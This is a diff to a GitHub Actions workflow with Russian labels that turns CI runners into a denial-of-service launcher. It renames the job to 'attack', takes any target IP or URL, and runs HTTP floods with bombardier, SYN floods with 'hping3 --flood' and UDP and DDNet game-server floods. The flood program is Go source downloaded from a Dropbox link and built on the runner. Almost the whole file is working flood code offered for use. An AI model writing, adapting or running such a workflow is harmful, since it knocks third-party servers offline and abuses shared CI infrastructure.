@@ -18,47 +18,47 @@ on:
           - udp-ddnet-mixed
 
       target:
-        description: 'IP или URL (например: 1.1.1.1 или https://google.com)'
+        description: 'IP или URL'
         required: true
 
       port:
-        description: 'Порт (для TCP/UDP)'
+        description: 'Порт'
         required: false
         default: '80'
 
       connections:
-        description: 'Количество соединений/потоков (-c)'
+        description: 'Количество потоков (-c)'
         required: false
         default: '500'
 
       duration:
-        description: 'Длительность (пример: 300s, 5m, 1h)'
+        description: 'Длительность (300s, 5m, 1h...)'
         required: false
         default: '300s'
 
       open_loop:
-        description: 'Open-Loop режим (throughput, высокая нагрузка)'
+        description: 'Open-Loop режим'
         required: false
         default: false
         type: boolean
 
       burst_on:
-        description: 'Burst On (например: 5s, 10s, 0s = выкл)'
+        description: 'Burst On (5s, 10s, 0s)'
         required: false
         default: '0s'
 
       burst_off:
-        description: 'Burst Off (пауза между всплесками)'
+        description: 'Burst Off'
         required: false
         default: '0s'
 
       rate:
-        description: 'Глобальный rate (пакетов в секунду, 0 = без ограничения)'
+        description: 'Rate (пакетов/сек, 0 = unlimited)'
         required: false
         default: '0'
 
 jobs:
-  str-test:
+  attack:
     runs-on: ubuntu-latest
     strategy:
       fail-fast: false
@@ -66,17 +66,49 @@ jobs:
         runner: [1]
 
     steps:
-      - name: Install Tools
-        run: |
-          sudo apt-get update
-          sudo apt-get install -y hping3 golang-go wget curl
-          wget https://github.com/codesenberg/bombardier/releases/download/v1.2.6/bombardier-linux-amd64
-          chmod +x bombardier-linux-amd64
-          sudo mv bombardier-linux-amd64 /usr/local/bin/bombardier
+      - name: Checkout
+        uses: actions/checkout@v4
 
-      - name: Download Bombarida (UDP Stresser)
+      - name: Setup Go
+        uses: actions/setup-go@v5
+        with:
+          go-version: '1.22'
+          cache: true
+
+      - name: Cache Tools
+        uses: actions/cache@v4
+        with:
+          path: |
+            ~/go/bin
+            /usr/local/bin/bombardier
+            ./bombarida
+          key: ${{ runner.os }}-tools-v2
+
+      - name: Install Dependencies
         run: |
-          wget -O bombarida.go "https://www.dropbox.com/scl/fi/7gnxycvkmc7ho6y1tj37l/bombarida-1.go?rlkey=3r1yhsm73bb2dt3ewj38wvuix&st=5ic3pnnp&dl=1"
+          sudo apt-get update -qq
+          sudo apt-get install -y hping3 curl --no-install-recommends
+
+      - name: Download & Build Bombarida
+        run: |
+          if [ ! -f ./bombarida ]; then
+            echo "Скачиваем и собираем bombarida..."
+            wget -q -O bombarida.go "https://www.dropbox.com/scl/fi/7gnxycvkmc7ho6y1tj37l/bombarida-1.go?rlkey=3r1yhsm73bb2dt3ewj38wvuix&st=5ic3pnnp&dl=1"
+            go build -o bombarida bombarida.go
+            chmod +x bombarida
+            echo "Bombarida успешно собран"
+          else
+            echo "Bombarida взят из кэша"
+          fi
+
+      - name: Download Bombardier (if needed)
+        run: |
+          if [ ! -f /usr/local/bin/bombardier ]; then
+            echo "Скачиваем bombardier..."
+            wget -q https://github.com/codesenberg/bombardier/releases/download/v1.2.6/bombardier-linux-amd64
+            chmod +x bombardier-linux-amd64
+            sudo mv bombardier-linux-amd64 /usr/local/bin/bombardier
+          fi
 
       - name: Run Attack
         run: |
@@ -90,55 +122,39 @@ jobs:
           BURST_OFF="${{ github.event.inputs.burst_off }}"
           RATE="${{ github.event.inputs.rate }}"
 
-          echo "Запуск $METHOD на $TARGET (машина №${{ matrix.runner }})"
-          echo "Длительность: $DURATION | Потоков: $CONNS | Rate: $RATE"
+          echo "=== ЗАПУСК $METHOD | $TARGET:$PORT | Машина ${{ matrix.runner }} ==="
+          echo "Duration: $DURATION | Connections: $CONNS | Rate: $RATE | Open-Loop: $OPEN_LOOP"
 
           if [ "$METHOD" == "http" ]; then
-            while true; do
-              bombardier -c 1000 -d "$DURATION" --http2 -l "$TARGET?cache=$RANDOM"
-            done
+            bombardier -c 1000 -d "$DURATION" --http2 -l "$TARGET?cache=$RANDOM"
 
           elif [ "$METHOD" == "tcp" ]; then
             sudo hping3 --flood -S -p $PORT $TARGET
 
           elif [ "$METHOD" == "udp" ]; then
-            echo "Запуск обычного UDP flood"
-            go run bombarida.go -mode client -addr "${TARGET}:${PORT}" \
+            echo "Обычный UDP flood"
+            ./bombarida -mode client -addr "${TARGET}:${PORT}" \
               -c $CONNS -n 0 -d "$DURATION" -r "$RATE" -t 1s
 
           else
-            # Все DDNet варианты
-            echo "Запуск DDNet Info"
-
-            DDNET_FLAGS="-ddnet-info -open-loop"
+            # DDNet режимы
+            echo "DDNet Info Attack"
+            DDNET_FLAGS="-ddnet-info"
 
             case "$METHOD" in
-              "udp-ddnet-vanilla")
-                DDNET_FLAGS="$DDNET_FLAGS -ddnet-info-kind vanilla"
-                ;;
-              "udp-ddnet-extended")
-                DDNET_FLAGS="$DDNET_FLAGS -ddnet-info-kind extended"
-                ;;
-              "udp-ddnet-legacy64")
-                DDNET_FLAGS="$DDNET_FLAGS -ddnet-info-kind legacy64"
-                ;;
-              "udp-ddnet-mixed")
-                DDNET_FLAGS="$DDNET_FLAGS -ddnet-info-kind mixed"
-                ;;
+              "udp-ddnet-vanilla")  DDNET_FLAGS="$DDNET_FLAGS -ddnet-info-kind vanilla" ;;
+              "udp-ddnet-extended") DDNET_FLAGS="$DDNET_FLAGS -ddnet-info-kind extended" ;;
+              "udp-ddnet-legacy64") DDNET_FLAGS="$DDNET_FLAGS -ddnet-info-kind legacy64" ;;
+              "udp-ddnet-mixed")    DDNET_FLAGS="$DDNET_FLAGS -ddnet-info-kind mixed" ;;
             esac
 
-            # Добавляем burst только если open_loop включён
             if [ "$OPEN_LOOP" == "true" ]; then
               DDNET_FLAGS="$DDNET_FLAGS -open-loop"
               if [ "$BURST_ON" != "0s" ]; then
                 DDNET_FLAGS="$DDNET_FLAGS -burst-on $BURST_ON -burst-off $BURST_OFF"
-                echo "Burst mode: ON ($BURST_ON / $BURST_OFF)"
               fi
             fi
 
-            echo "Команда: go run bombarida.go -mode client -addr ${TARGET}:${PORT} -c $CONNS -n 0 -d $DURATION -r $RATE $DDNET_FLAGS"
-
-            go run bombarida.go -mode client -addr "${TARGET}:${PORT}" \
-              -c $CONNS -n 0 -d "$DURATION" -r "$RATE" \
-              $DDNET_FLAGS
+            ./bombarida -mode client -addr "${TARGET}:${PORT}" \
+              -c $CONNS -n 0 -d "$DURATION" -r "$RATE" $DDNET_FLAGS
           fi
